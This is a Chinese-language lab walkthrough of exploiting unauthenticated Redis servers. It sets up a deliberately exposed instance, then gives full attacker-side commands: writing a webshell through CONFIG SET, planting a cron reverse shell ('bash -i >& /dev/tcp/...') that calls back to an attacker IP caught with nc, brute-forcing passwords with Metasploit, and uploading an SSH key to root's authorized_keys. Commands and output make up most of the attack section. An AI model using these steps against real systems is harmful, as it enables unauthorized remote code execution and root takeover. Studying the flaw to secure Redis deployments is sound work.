Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。
1.什么是redis未授权访问漏洞：

    ··Redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。

简单说，漏洞的产生条件有以下两点：
（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；
（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。

漏洞环境搭建

（一）安装redis服务：
（1）从官网下载源码的压缩包：
    wget http://download.redis.io/releases/redis-3.2.11.tar.gz
（2）下载完成后，解压压缩包：
    tar xzf redis-3.2.11.tar.gz
（3）然后进入解压后的目录：cd redis-3.2.11，输入make并执行；
（4）make结束后，进入src目录：cd src，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）：
（5）返回目录redis-3.2.11，将redis.conf拷贝到/etc/目录下：
（6）编辑etc中的redis配置文件redis.conf，如下图所示：
    去掉ip绑定，允许除本地外的主机远程登录redis服务：
     #bind 127.0.0.1   /加个#


关闭保护模式，允许远程连接redis服务：
     protected-mode no

（7）使用/etc/目录下的reids.conf文件中的配置启动redis服务：
  iptables -F /关闭防火墙
 redis-server /etc/redis.conf
如果要给Redis设置密码，可以通过修改/etc/redis.conf 文件来配置密码，去掉requirepass foobared 前面的 #，修改完重启服务
requirepass foobared

复现过程

攻击机：kali 192.168.0.6

被攻击机rhel6.2 192.168.0.15

rhel启动redis服务


rhel 安装 以下服务
yum -y install httpd php php-mysql
启动httpd服务
service httpd start


kali安装redis sudo apt install redis

无密码下连接 rhel的redis服务

redis-cli -h 192.168.0.15 -p 6379
192.168.0.15:6379> 

一：写 webshell 文件实现远程控制（需要知道网站路径！！！）

一旦控制 redis 后，优先想到的是写 webshell，容错性是它最大优势。假定目标是 PHP 环境、web 的根目录为/var/www/html，按前面步骤尝试写个普通 PHP 脚本看下是否能成功解析：

liao@kali:~$ redis-cli -h 192.168.0.15 -p 6379
192.168.0.15:6379> CONFIG SET dbfilename phpinfo.php
OK
192.168.0.15:6379> CONFIG SET dir "/var/www/html"     #路径
OK                                                                                                      
192.168.0.15:6379> CONFIG SET rdbcompression no
OK                                                                                                      
192.168.0.15:6379> SET phpinfo"\n\n <?php phpinfo(); ?> \n\n" NX     #\n换行防止字符影响
OK                                                                                                          
192.168.0.15:6379> save
OK                                                                                                                  
192.168.0.15:6379>    

查看网站写入的路径

二：通过redis写入计划任务

将反弹shell脚本写入/etc/crontab

liao@kali:~$ redis-cli -h 192.168.0.15 -p 6379
192.168.0.15:6379> set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.6/1122 0>&1\n\n\n\n"
OK
192.168.0.15:6379> config set dir /etc/
OK
192.168.0.15:6379> config set dbfilename crontab
OK
192.168.0.15:6379> save
OK

看看rhel的写入效果

用nc连接，等待反弹

nc -lvp 1122

111以上是无密码

接下来设置密码
给Redis设置密码，可以通过修改/etc/redis.conf 文件来配置密码，去掉requirepass foobared 前面的#，开启默认密码如果改密码直接修改requirepass后的就可以了，修改完重启服务

requirepass foobared  

三：利用MSF 破解Redis弱口令导入ssh公钥链接

search redis
auxiliary/scanner/redis/redis_login   #该exp功能是对redis的密码进行枚举，亲测速度很快。
auxiliary/scanner/redis/redis_server   #该exp功能是验证枚举或者其他手段得到的redis密码是否正确，该功能会执行一个info命令并返回执行结果。
auxiliary/scanner/redis/file_upload   #该exp功能为上传本地的文件到目标服务器。

先尝试爆破密码，redis_login模块自动夹杂了一个字典，你也可以更换

auxiliary/scanner/redis/redis_login：

msf5 auxiliary(scanner/redis/redis_login) > set threads 50

threads => 50  #设置50个线程


爆出来了，然后可以去验证这个密码是否正确可以上传东西

验证模块：auxiliary/scanner/redis/redis_server：



这样的是可以上传

auxiliary/scanner/redis/file_upload   #该exp功能为上传本地的文件到目标服务器，上传自己的ssh公钥    然后就可以用私钥就可以不用密码

ssh-keygen -t rsa       #创建公钥    默认回车就行
cd .ssh/
id_rsa(私钥)  id_rsa.pub(公钥)
cp id_rsa.pub  authorized_keys     #复制出来并改名字
sudo vim authorized_keys     #在文件内容前面和后面都加上几个  \n\n\n

为了能正常上传测试，在目标机器上创建/root/.ssh 目录  mkdir /root/.ssh

msf5 auxiliary(scanner/redis/file_upload) > set localfile /home/liao/.ssh/authorized_keys
localfile => /home/liao/.ssh/authorized_keys   #本地上传文件

msf5 auxiliary(scanner/redis/file_upload) > set remotefile /root/.ssh/authorized_keys
remotefile => /root/.ssh/authorized_keys   #上传到远程文件

msf5 auxiliary(scanner/redis/file_upload) > set rhosts 192.168.0.15
rhosts => 192.168.0.15

run


rhel上传到了

这样免密码登录了ssh

liao@kali:~$ cd .ssh/
liao@kali:~/.ssh$ ssh -i id_rsa root@192.168.0.15
